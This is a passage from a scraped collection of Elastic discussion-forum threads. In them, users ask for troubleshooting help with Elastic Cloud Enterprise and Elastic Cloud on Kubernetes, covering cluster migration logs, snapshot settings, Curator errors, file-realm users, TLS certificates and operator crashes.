charset=UTF-8,{\"transient\":{\"cluster\":{\"routing\":{\"allocation\":{\"exclude\":{\"_name\":\"instance-0000000001,1527177893494\"},\"awareness\":{\"attributes\":\"\"}}}}}}),HTTP/1.1)] {\"cluster_id\":\"05274b09effb4f9f9d237d0f92204ce9\"} [2018-05-24 16:04:53,655][INFO ][no.found.cluster.plan.elasticsearch.05274b09effb4f9f9d237d0f92204ce9] Found bad verifications: [List((ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000000),Missing(ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000000)),no.found.curator.pimps.FutureWatchedEvent@6df3d48e))] {\"cluster_id\":\"05274b09effb4f9f9d237d0f92204ce9\"} [2018-05-24 16:04:53,655][INFO ][no.found.cluster.plan.elasticsearch.05274b09effb4f9f9d237d0f92204ce9] Verified migration with result: [List((ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000006),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@1e62aa77), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000007),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@1b323d68), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000004),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@75722552), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000005),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@826be57), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000002),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@31c8c36), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000003),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@94f3840), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000000),Missing(ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000000)),no.found.curator.pimps.FutureWatchedEvent@6df3d48e), (ElasticsearchInstance(ElasticsearchCluster(05274b09effb4f9f9d237d0f92204ce9),instance-0000000001),ClusterStateVerified(true,QEw_XswtQxaT4y22ulhZrw,Set(STARTED)),no.found.curator.pimps.FutureWatchedEvent@509a1b61))] {\"cluster_id\":\"05274b09effb4f9f9d237d0f92204ce9\"} [2018-05-24 16:04:53,494][INFO ][no.found.cluster.plan.elasticsearch.05274b09effb4f9f9d237d0f92204ce9] Need to set exclusions and awareness attributes. Current values are [Set(instance-0000000001, 1527177873195)] and [Set()] {\"cluster_id\":\"05274b09effb4f9f9d237d0f92204ce9\"} I was watching /_cat/shards for anything not STARTED but all shards were reported STARTED. Does this mean anything? Thanks. Jin.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9311281c-1569-4319-8dc6-7d006ea327c5",
    "url": "https://discuss.elastic.co/t/unable-to-reset-snapshot-status/132670",
    "title": "Unable to reset snapshot status",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 21, 2018, 3:07pm May 23, 2018, 1:23pm May 24, 2018, 2:55pm June 7, 2018, 2:55pm",
    "body": "ECE admin console allows me to assign a repository to a cluster but the cluster will stuck in an unhealthy state if I remove that snapshot repository from cluster. The error is 'Cluster health issue: Snapshots are disabled'. Is there a way to reset this state back to normal? Thanks. Jin.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0d883534-365c-4fbc-bf81-f15fbda08efc",
    "url": "https://discuss.elastic.co/t/allocators-reset-maintenance-status-after-reboot/132667",
    "title": "Allocators reset maintenance status after reboot",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 21, 2018, 2:39pm June 4, 2018, 2:39pm",
    "body": "I put an allocator with no es/kibana nodes running into maintenance mode and rebooted it. After reboot, the allocator is no longer in maintenance mode. Is this an expected behavior? I would rather keep the node in maintenance mode after reboot. Thanks. Jin.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a0c2a8d3-2988-418d-96d6-56b233bd9c0e",
    "url": "https://discuss.elastic.co/t/failed-to-reconfigure-kibana-in-ece-1-1-3/132384",
    "title": "Failed to reconfigure Kibana in ECE 1.1.3",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 17, 2018, 6:53pm May 17, 2018, 6:55pm May 18, 2018, 3:48pm May 18, 2018, 4:01pm May 18, 2018, 4:03pm May 18, 2018, 4:38pm June 1, 2018, 4:38pm",
    "body": "I was trying to add an xpack option to kibana via ECE admin console: xpack.reporting.queue.timeout: 60000 However, kibana does not come back and reports: [2018-05-17 18:40:42,682][INFO ][no.found.cluster.plan.kibana.6cce5e34496841a0bc4123508dfdce79] Waiting for ephemeral nodes to disappear for instance [instance-0000000002]: [List((inspect,1550483376799,1550483376799,1526581524697,1526581524697,0,0,0,720575942518046807,5234,0,1550483376799 [2018-05-17 18:40:45,305][INFO ][no.found.runner.docker.ContainerInspector] Container not found. {\"ec_container_kind\":\"kibana\",\"ec_container_group\":\"6cce5e34496841a0bc4123508dfdce79\",\"ec_container_name\":\"instance-0000000002\"} Then I created a brand new cluster and applied the same configuration to kibana. It was a success. Does these two messages mean anything? Thanks. Jin.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "84007c94-ba77-4221-bb46-38c8db36b25a",
    "url": "https://discuss.elastic.co/t/multiple-nodes-of-one-cluster-on-one-runner/131355",
    "title": "Multiple nodes of one cluster on one runner",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 10, 2018, 8:38pm May 11, 2018, 2:54pm May 25, 2018, 2:50pm",
    "body": "I have a cluster in ECE with two nodes/two zones setup. The ECE has several spare runners are available. It works normally as expected. But I noticed that two nodes were assigned to one runner in a given zone. Is it right that ECE may deploy multiple nodes of one cluster to one single runner? This is a concern that the cluster may loose more than one node due to runner issue which seems to be risky. Thank you. Jin.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d3d86118-84fb-40ac-9628-09bc1320918c",
    "url": "https://discuss.elastic.co/t/where-or-how-to-get-docker-1-11/130544",
    "title": "Where or How to get Docker 1.11",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "May 4, 2018, 2:03am May 4, 2018, 10:23am May 7, 2018, 11:00am May 21, 2018, 11:00am",
    "body": "I am trying to install Elastic Cloud Enterprise on Ubuntu Server 16.04 and understand that ECE runs on Docker 1.11. Based on the instructions from the Docker documentation to set up a registry, it looks like 1.11 is no longer in the registry list. How or where can get I get Docker 1.11 to install ECE?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fdae27ab-8229-4bbf-99f1-063712358da7",
    "url": "https://discuss.elastic.co/t/how-to-change-kibana-yml-in-elastic-cloud/130460",
    "title": "How to change kibana.yml in elastic cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Karolinebryn",
    "date": "May 3, 2018, 1:34pm May 4, 2018, 2:48am May 4, 2018, 7:49am May 4, 2018, 8:18am May 4, 2018, 8:33am May 18, 2018, 8:33am",
    "body": "We are using Elastic Cloud to host our elastic solution. We have some issues with generating reports and need to increase the xpack.reporting.queue.timeout in the kibana.yml file. But where do you find the kibana.yml file in Elastic Cloud? Or how can you change configs for kibana?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "631a2c12-e048-4aee-b39c-310f5dc8d3f0",
    "url": "https://discuss.elastic.co/t/load-balancing-ece-deployments/130077",
    "title": "Load Balancing ECE Deployments",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "John_Zimmerman",
    "date": "May 2, 2018, 12:14am May 2, 2018, 6:18pm May 3, 2018, 5:54pm May 17, 2018, 5:54pm",
    "body": "I'm looking for example configurations for load balancing ECE deployments and was hoping others have something they'd be able to share. The ECE documentation appears to just leave the load balancing recommendation as \"user supplied\", \"tcp streams\", and a list of ports. Fine for the basics, but I'd like to an idea of what kinds of details people of found necessary in their deployments. Also is anyone load balancing the Cloud UI/Admin services (ports 12300, 12343, 12400, 12443) in addition to elastic/kibana clusters (ports 9200, 9243, 9300, 9343)? I'm currently looking at HAProxy (excluded Nginx) to do the job.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "914db102-58dd-4e02-8720-c58ee8ccf027",
    "url": "https://discuss.elastic.co/t/enquiry-on-indexing-into-ece-and-docker-version/128496",
    "title": "Enquiry on Indexing into ECE and Docker Version",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "April 18, 2018, 9:38am April 18, 2018, 10:20am May 2, 2018, 10:20am",
    "body": "I have 2 questions regarding the Elastic Cloud Enterprise. When indexing documents into a cluster in ECE, does the client application send the data to the proxy or directly to the ES node within the allocators? Besides Docker version 1.11, does ECE install on newer versions of docker (e.g. the latest version 18.03) ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d3ef7af4-47f9-445b-b64d-e3e1f3cebad5",
    "url": "https://discuss.elastic.co/t/can-we-have-alias-to-cluster-id-in-the-url/125474",
    "title": "Can we have alias to cluster ID in the URL?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "D.J",
    "date": "March 25, 2018, 9:15am March 25, 2018, 9:35am March 31, 2018, 9:50am April 14, 2018, 9:50am",
    "body": "Hi, we have setup a wildcard dns to the proxy endpoints. but still , must all client connect to something like http://eb1f0e8c82dc4425b32250fb5b3d0ec5.... ?? and for Kibana we must use something different ? can we have some alias (somewhere ) when accessing a cluster ? like : http://my_cluster_alias.<cluster endpoint>:9200 ..... Thanx",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c120fd6d-0358-4df7-ac64-b6fa44f4b420",
    "url": "https://discuss.elastic.co/t/curator-example-not-taking-action-w-error/125766",
    "title": "Curator example not taking action & w/error",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gigabyte",
    "date": "March 27, 2018, 2:21pm March 27, 2018, 2:03pm March 27, 2018, 2:29pm March 27, 2018, 2:55pm March 27, 2018, 4:36pm March 27, 2018, 6:17pm March 27, 2018, 6:39pm March 28, 2018, 4:03pm April 11, 2018, 4:03pm",
    "body": "Forgive me. Used ~v2 of the ELK and jumping forward and believe it's something simple but it's not jumping out at me after staring at the screen for a couple of days now. Get the same ~error from curator at the command line as what's recorded in debug mode in the log file and the action to close is not performed. Can someone please take a quick pass and advise what I'm doing wrong? Using v5.5.1 of curator and v6.2.2 of ES. /usr/bin/curator --config /etc/elasticsearch-curator/curator.yml /etc/elasticsearch-curator/action_close.yml Response from debug and same general error from the command-line response. The rest of the debug looks \"good\" as the indexes \"remain in the list\", etc. and no errors seen until the very end. Can provide rest of debug log if requested. 2018-03-27 09:35:03,401 ERROR curator.cli run:184 Failed to complete action: close. <class 'curator.exceptions.FailedExecution'>: Exception encountered. Rerun with loglevel DEBUG and/or check Elasticsearch logs for more information. Exception: TransportError(403, 'cluster_block_exception', 'blocked by: [FORBIDDEN/12/index read-only / allow delete (api)];') curator.yml client: hosts: - 127.0.0.1 port: 9200 url_prefix: use_ssl: False certificate: client_cert: client_key: ssl_no_validate: False http_auth: timeout: 30 master_only: False logging: loglevel: DEBUG logfile: /var/log/elasticsearch-curator/debug.log logformat: default blacklist: ['elasticsearch', 'urllib3'] action_close.yml actions: 1: action: close description: >- Close indices older than 2 days (based on index name), for logstash- prefixed indices. options: delete_aliases: False timeout_override: continue_if_exception: False disable_action: False filters: - filtertype: pattern kind: prefix value: logstash- exclude: False - filtertype: age source: name direction: older timestring: '%Y.%m.%d' unit: days unit_count: 2 exclude: GET /_cat/indices?v health status index uuid pri rep docs.count docs.deleted store.size pri.store.size yellow open logstash-2018.03.22 5kZGtUBPSH-AlUCQO0Xg3w 5 1 1376736 0 1gb 1gb yellow open logstash-2018.03.12 FEev1P9ySA6XqUvjFY65Ww 5 1 5909374 0 3.9gb 3.9gb yellow open logstash-2018.03.11 sRJBAMlmTvyEpxshTWLEtA 5 1 3258232 0 2.2gb 2.2gb yellow open logstash-2018.03.08 XTO86zklToiYiisPIRpX6w 5 1 305 0 617.7kb 617.7kb green open .monitoring-alerts-6 nTLlITQdTL6P930AQHB1Lw 1 0 2 1 12.9kb 12.9kb green open .triggered_watches DRW4zTWERtqH6SyJENuIDQ 1 0 0 0 5.1kb 5.1kb green open .watches -VP137M7ToiwJ7TCua8FcQ 1 0 6 0 24.5kb 24.5kb close .watcher-history-7-2018.03.22 C0alcRK9QtGJCbzLKIjWoQ yellow open logstash-2018.03.23 kKCz3ve1SFeLeTxtt4O-Wg 5 1 909987 0 706.9mb 706.9mb yellow open logstash-2018.03.09 quU6dgvES5mqup828g1NRw 5 1 579 0 977.9kb 977.9kb green open .monitoring-es-6-2018.03.22 bM8BUjstTiOUPXzIR4WOSQ 1 0 925 0 479.5kb 479.5kb yellow open logstash-2018.03.26 L-xEeawmQoueFuktZTZmZg 5 1 4138979 0 3gb 3gb yellow open logstash-2018.03.15 QadOJOHhRPyRTSsXjcQObQ 5 1 1811456 0 1.3gb 1.3gb yellow open logstash-2018.03.27 660-4JaHS4eSo5R6bIGryQ 5 1 1876957 0 1.2gb 1.2gb green open .kibana m9Lh3v-MSSKCFnlqKe2iig 1 0 11 5 71.6kb 71.6kb yellow open logstash-2018.03.13 AcHi8k9LTtangpOEi_D3sw 5 1 28971 0 25.9mb 25.9mb yellow open logstash-2018.03.10 xbDIUicyQSuRgLyN4a1Wqw 5 1 322 0 484.9kb 484.9kb",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "ec8a6813-c3c1-4f7f-9be9-81a3878423c1",
    "url": "https://discuss.elastic.co/t/nginx-and-ece/125967",
    "title": "Nginx and ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "iremmats",
    "date": "March 28, 2018, 3:50pm April 11, 2018, 3:51pm",
    "body": "Hi, Just quick question reaching out to the community. How many are running nginx in front of their ECE installation? If there are any, would you mind sharing how to do a good configuration so that all timeouts align with each other and so on.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "db980a0f-52d0-47ac-bacf-6f2fb4c64850",
    "url": "https://discuss.elastic.co/t/ece-error-on-new-aws-ec2-install/121960",
    "title": "ECE Error on New AWS EC2 Install",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Christopher_Wolfe",
    "date": "February 28, 2018, 11:38pm March 14, 2018, 11:39pm March 15, 2018, 8:40pm",
    "body": "Sorry if this issue has already been discussed... I'm installing ECE on AWS EC2 instances. I am using the new Elastic-Cloud-Enterprise AMI \"ami-a50ab9dd\" in the Oregon region. Installation completes successfully, but I get the following error when I log onto ECE: \"Fetching region ece-region failed\". Is there a fix for this? Thanks, Chris",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "06ef0f06-a7ab-47c3-a716-cc67fd056897",
    "url": "https://discuss.elastic.co/t/docker-1-11-for-rhel7/122714",
    "title": "Docker 1.11 for Rhel7",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "D.J",
    "date": "March 6, 2018, 12:11pm March 15, 2018, 8:28pm March 29, 2018, 8:28pm",
    "body": "Hi, 1. I know you are working on certifying the ece for higher versions of docker, can you tell on which docker version you are testing it ? 2. im on rhel7 3.10 and I cannot find the rhel 7 docker rpm. is it verified with the 11.1.2 for centos ? can you please specify exactly which version it is certified with for redhat 7 (if you can provide DL link for it that would be appreciated. ) Thanx",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "56affb76-07bf-4f15-b8be-83fbb8b6c16a",
    "url": "https://discuss.elastic.co/t/access-restrictions/117457",
    "title": "Access restrictions",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Lafunamor",
    "date": "January 29, 2018, 12:47pm February 12, 2018, 12:48pm March 15, 2018, 8:13pm",
    "body": "Hi guys, Is there a way to restrict access to a ES instance on ECE? I've played around with IP filtering but due to the design, ES instances only se traffic from the proxies. Usually proxies provide something like an X-Forwarded-For header with the source IP. Is there a similar system I could leverage or do you have an other suggestion for an additional way to restrict access (except username / password)? Thanks for your feedback.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b2f7792d-1615-4e64-81e8-56f5971c3be6",
    "url": "https://discuss.elastic.co/t/how-important-to-have-3-zones-for-a-cluster/123577",
    "title": "How important to have 3 zones for a cluster?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "D.J",
    "date": "March 12, 2018, 3:28pm March 12, 2018, 4:19pm March 13, 2018, 10:32am March 14, 2018, 9:24pm March 28, 2018, 9:25pm",
    "body": "Hi, I understand that it is recommended to have 2-3 zones for production cluster. the main documented reason is that in case entire site has an issue then It would have a redundant fail-over site. also , I know that for defining 3 dedicated master I must use the \"master per zone\" checkbox. but let say I dont expect ALL Zone to be down , and I can setup each node as master eligible , are there any other factors I did not think of for choosing between 1 or 3 zones ? my main issue started by having 5 servers to ece, so , if I have 3 zones , then I have : Zone1 - 2 servers Zone2 - 2 servers and Zone3 - one server. (unbalanced ) scaling up is always by multiplication of 3 , and I might have issue in zone3. if I have all 5 servers in single zone, then I can scale up better and use resources better.... please suggest.... DJ",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bd4e5cf7-1f09-46d7-b5ab-de3bbcd9d0b1",
    "url": "https://discuss.elastic.co/t/nodes-not-balanced-within-zone/121663",
    "title": "Nodes not balanced within Zone",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "D.J",
    "date": "February 27, 2018, 1:42pm February 28, 2018, 8:30am February 28, 2018, 9:08am March 6, 2018, 5:10pm March 5, 2018, 1:58pm March 19, 2018, 1:59pm",
    "body": "Hi, I have region with 3 zones. Zone1 - one allocator host Zone2 - 2 allocators hosts Zone3 - one allocator host I created a cluster with 5 nodes per zone, and in zone2 (the one with 2 hosts ) it created all 5 nodes on a single host leaving the otherone empty. even when trying to move a single node to the other allocator (using the Target flag or even without it ) it moved ALL the nodes to the second allocator (leaving the one empty again) am i missing something in the behaviour ? shouldn't nodes be balanced between the allocators (within the same zone ) ? Thank DJ",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "68d9d8a0-2a7e-485f-88f6-d716e1e338cd",
    "url": "https://discuss.elastic.co/t/troubleshooting-ece-fail-after-restart/121012",
    "title": "Troubleshooting ECE fail after restart",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "D.J",
    "date": "February 22, 2018, 8:45am February 22, 2018, 2:23pm February 26, 2018, 7:20am February 26, 2018, 2:56pm March 12, 2018, 2:56pm",
    "body": "Hi, I have installed ECE 1.1.3 , used the UI to create 3 nodes cluster. I wanted to check how it will behave after host failure (reboot). now, I see docker is up, in \"docker ps\" I see many containers running. I was able to enter ECE UI but dont see anything there ! no cluster . nada. I run the curl API it returns output with all clusters (2 internal ) + my cluster. but most not healthy. I am rather new to the ece concept and dockers. in past with standalone I knew to check the elastic/kibana processes. but now, documentation is not that good with troubleshooting such issues.. questions : what should I check running on the host machine ? any way to validate ece started well ? I have a about 50 log files that were written , which one should I look ? which log should I start with ? any documentation about the logs or directory structure ? Thank you",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "78e52500-6038-4d81-8265-f7716dac27d8",
    "url": "https://discuss.elastic.co/t/about-the-elastic-cloud-on-kubernetes-eck-category/183899",
    "title": "About the Elastic Cloud on Kubernetes (ECK) category",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "uricohen",
    "date": "June 3, 2019, 7:04am",
    "body": "All things related to your ECK and running the Elastic stack on Kubernetes.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "30e066f2-d93f-45cf-bccf-9a085d2e9459",
    "url": "https://discuss.elastic.co/t/cant-login-with-users-created-by-filerealm-and-secrets/229320",
    "title": "Can't login with users created by FileRealm and secrets",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "doctor",
    "date": "April 22, 2020, 4:59pm April 22, 2020, 5:34pm",
    "body": "Hey, I'm trying to create a new user on ECK using secrets and FileRealm. I created the user like explained in the documentation: # create a folder with the 2 files mkdir filerealm touch filerealm/users filerealm/users_roles # create user 'myuser' with role 'monitoring_user' docker run \\ -v ${PWD}/filerealm:/usr/share/elasticsearch/config \\ docker.elastic.co/elasticsearch/elasticsearch:{version} \\ bin/elasticsearch-users useradd myuser -p mypassword -r monitoring_user # create a Kubernetes secret with the file realm content kubectl create secret generic my-file-realm-secret --from-file filerealm The user \"mysuser\" with password \"mypassword\" now exists inside a secret. My elastic config looks like this: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.6.1 auth: fileRealm: - secretName: my-filerealm-secret nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false Unfortunatly, trying to loging with the credentials set above is not working. I can't login within Kibana and curling elastic-http is also forbiden if using this particular user.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "519da048-4bc7-42c0-84dd-cf68ce838a61",
    "url": "https://discuss.elastic.co/t/elastic-operator-0-goes-into-crashloopbackoff-possibly-after-underlying-node-restarted/228181",
    "title": "Elastic-operator-0 goes into CrashLoopbackOff possibly after underlying node restarted",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dineshabbi",
    "date": "April 15, 2020, 6:05pm April 15, 2020, 8:58pm April 16, 2020, 3:08pm April 16, 2020, 3:17pm April 20, 2020, 12:40pm April 21, 2020, 4:15pm April 22, 2020, 5:50am",
    "body": "I am running elastic-operator 1.0.0-beta1 and hitting following issue. image: docker.elastic.co/eck/eck-operator:1.0.0-beta1 ❯ kubectl get pods -n elasticsearch NAME READY STATUS RESTARTS AGE ct-es-es-data-nodes-0 1/1 Running 0 19d ct-es-es-data-nodes-1 1/1 Running 0 19d ct-es-es-data-nodes-2 1/1 Running 0 19d ct-kibana-kb-c89445c75-cvvjf 1/1 Running 1 19d elastic-operator-0 0/1 CrashLoopBackOff 5565 19d I think possibly there was an EKS upgrade performed 19 days ago which restarted all the aws nodes in the cluster, but I observe that the operator pod goes into this state throwing these logs. ❯ kubectl logs elastic-operator-0 -n elasticsearch {\"level\":\"info\",\"@timestamp\":\"2020-04-15T17:55:27.084Z\",\"logger\":\"manager\",\"message\":\"Setting up client for manager\",\"ver\":\"1.0.0-beta1-84792e30\"} {\"level\":\"info\",\"@timestamp\":\"2020-04-15T17:55:27.084Z\",\"logger\":\"manager\",\"message\":\"Setting up scheme\",\"ver\":\"1.0.0-beta1-84792e30\"} {\"level\":\"info\",\"@timestamp\":\"2020-04-15T17:55:27.085Z\",\"logger\":\"manager\",\"message\":\"Setting up manager\",\"ver\":\"1.0.0-beta1-84792e30\"} {\"level\":\"info\",\"@timestamp\":\"2020-04-15T17:55:27.590Z\",\"logger\":\"controller-runtime.metrics\",\"message\":\"metrics server is starting to listen\",\"ver\":\"1.0.0-beta1-84792e30\",\"addr\":\":0\"} {\"level\":\"error\",\"@timestamp\":\"2020-04-15T17:55:27.592Z\",\"logger\":\"manager\",\"message\":\"unable to get operator info\",\"ver\":\"1.0.0-beta1-84792e30\",\"error\":\"configmaps \\\"elastic-operator-uuid\\\" is forbidden: User \\\"system:serviceaccount:elasticsearch:elastic-operator\\\" cannot get resource \\\"configmaps\\\" in API group \\\"\\\" in the namespace \\\"elasticsearch\\\"\",\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.execute\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:254\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.glob..func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:74\\ngithub.com/spf13/cobra.(*Command).execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:830\\ngithub.com/spf13/cobra.(*Command).ExecuteC\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:914\\ngithub.com/spf13/cobra.(*Command).Execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:864\\nmain.main\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/main.go:27\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\"} Can someone help what is the reason and how to recover the operator pod without impacting existing ES cluster ?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "76391e84-4cea-49d4-a9aa-955632e7e5f4",
    "url": "https://discuss.elastic.co/t/communicating-with-eck-using-your-own-certs-results-in-a-certificate-error/224710",
    "title": "Communicating with ECK using your own certs results in a certificate error",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "doctor",
    "date": "March 23, 2020, 6:20pm March 24, 2020, 8:46am March 24, 2020, 11:26am March 24, 2020, 1:35pm April 20, 2020, 9:51am April 20, 2020, 10:32am April 20, 2020, 10:38am",
    "body": "Hey, I'm following the tutorial teaching how to set your own certificates. I installed the cert manager who created the quickstart-es-cert secret for me. $ k describe secret quickstart-es-cert Name: quickstart-es-cert Namespace: default Labels: <none> Annotations: cert-manager.io/alt-names: quickstart-es-http,quickstart-es-http.default.svc,quickstart-es-http.default.svc.cluster.local cert-manager.io/certificate-name: quickstart-es-cert cert-manager.io/common-name: cert-manager.io/ip-sans: cert-manager.io/issuer-kind: Issuer cert-manager.io/issuer-name: selfsigned-issuer cert-manager.io/uri-sans: Type: kubernetes.io/tls Data ==== tls.crt: 1229 bytes tls.key: 1675 bytes ca.crt: 1229 bytes But when I try to curl ES I get the following error: $ curl --cacert tls.crt -u elastic:$PW https://$IP:9200/ curl: (60) Certificate type not approved for application. My cluster's config is the following: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.6.1 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false http: service: spec: type: ClusterIP tls: selfSignedCertificate: subjectAltNames: - ip: 10.233.27.202 certificate: secretName: quickstart-es-cert Using ECK v1.0 Env: On premise Any help would be apreciated Thx",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b95be6c1-da4a-4393-87da-47b5a3253235",
    "url": "https://discuss.elastic.co/t/disk-resize-with-eck-vs-helm/228689",
    "title": "Disk resize with eck vs helm",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "deepak_deore",
    "date": "April 19, 2020, 2:43am April 19, 2020, 7:14am",
    "body": "ECK is very easy to use so I chose it but it has one downside compared helm, I could do disk resize with some hack in helm installed ES. But with operator installed ES this isn't possible, because as soon as I delete the statefulset, operator recreates it. I know this is kubernetes limitation that resizing statefulset isnt allowed but with the hack we could do with helm chart. Does anyone know how to resize the volume in operator installed ES? this is the main pain point that is hesitating me in using the ECK over helm otherwise it is great.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9bb5401c-c1c7-480f-958d-b0a1c4f9358f",
    "url": "https://discuss.elastic.co/t/reclaim-persistent-volume/228197",
    "title": "Reclaim persistent volume",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Nikolas_Mousouros",
    "date": "April 15, 2020, 7:28pm April 15, 2020, 7:59pm April 17, 2020, 3:04pm",
    "body": "I deleted my stateful set on openshift believing that I could reuse my persistent volume claim but it got deleted. On the bright side I think I still have this EBS volume on AWS so I added it again on openshift but when I try to reuse it my pvc named elasticsearch-data gets deleted and my persistent volume gets released. Anyone know what should I do to mount this or get the data from the volume?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "67b33c79-57eb-4fdc-8df8-23b9b4b54743",
    "url": "https://discuss.elastic.co/t/using-the-transportclient-with-eck/197767",
    "title": "Using the TransportClient with ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "akappler",
    "date": "September 3, 2019, 6:52am September 4, 2019, 10:12am September 4, 2019, 1:05pm April 7, 2020, 11:48am April 9, 2020, 12:07pm April 9, 2020, 12:29pm April 14, 2020, 3:16pm",
    "body": "We have a legacy application which uses the Java TransportClient to access the ES API on port 9300, which we would like to operate with the ES operator. It seems that the ES instance created by ECK only exposes the REST API on port 9200. Is it possible to use the API on port 9300? I tried to expose it via a Service, but it is secured by client certificate authentication and I cannot figure out how to create a valid certificate.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "7caa5ab4-b3f2-4dfc-9bbb-3856acf8cd36",
    "url": "https://discuss.elastic.co/t/eck-not-working-with-istio/227522",
    "title": "ECK not working with ISTIO",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ssurapan",
    "date": "April 10, 2020, 2:48pm April 14, 2020, 8:57am",
